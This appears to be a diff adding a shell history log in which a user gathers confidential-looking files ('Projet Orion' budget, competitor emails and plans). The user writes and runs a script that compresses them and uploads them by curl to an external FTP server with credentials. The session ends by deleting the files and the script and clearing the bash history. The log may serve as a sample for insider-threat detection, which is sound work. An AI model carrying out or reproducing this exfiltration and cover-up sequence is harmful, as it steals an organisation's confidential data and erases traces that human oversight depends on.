@@ -1,0 +1,35 @@
+whoami
+hostname
+cd /home/jmartin
+mkdir -p .backup
+ls -la
+ls -la .backup/
+ls .backup/Budget_2026.xlsx .backup/Emails_Concurrent.txt .backup/Plans_Confidentiels.pdf
+du -sh .backup/*
+cd /home/jmartin
+echo '#!/bin/bash' > upload.sh
+echo '# Transfert Projet Orion vers serveur externe' >> upload.sh
+echo 'cd /home/jmartin' >> upload.sh
+echo '7z a Projet_Orion_COMPLET.7z .backup/Budget_2026.xlsx .backup/Emails_Concurrent.txt .backup/Plans_Confidentiels.pdf' >> upload.sh
+echo 'curl -T Projet_Orion_COMPLET.7z ftp://ftp.novatek-industries.fr/incoming/jmartin/ --user jm-transfer:####' >> upload.sh
+echo 'echo Upload termine' >> upload.sh
+chmod +x upload.sh
+cat upload.sh
+ls -la upload.sh
+ls -la .backup/
+file .backup/Budget_2026.xlsx
+file .backup/Emails_Concurrent.txt
+file .backup/Plans_Confidentiels.pdf
+host ftp.novatek-industries.fr
+ping -c 1 ftp.novatek-industries.fr
+cd /home/jmartin
+./upload.sh
+ls -la Projet_Orion_COMPLET.7z
+echo done
+cd /home/jmartin
+rm -rf .backup/
+rm Projet_Orion_COMPLET.7z
+rm upload.sh
+history -c
+> ~/.bash_history
+exit
